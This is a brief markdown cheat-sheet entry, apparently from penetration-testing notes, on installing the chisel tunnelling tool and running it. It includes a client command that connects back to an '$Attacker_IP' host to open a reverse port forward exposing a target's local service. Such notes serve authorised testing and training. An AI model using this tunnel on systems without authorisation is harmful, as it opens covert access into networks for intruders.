## chisel

**Install:**
* `sudo go install github.com/jpillora/chisel@latest `
* `sudo cp ~/go/bin/chisel /usr/local/bin` - so that it can be run without specifying path 

**Usage:**
* Server: `sudo chisel server -p 9001 --reverse`
* Client: `chisel client $Attacker_IP:9001 R:$newPort:127.0.0.1:$oldPort` - newPort and oldPort can be the same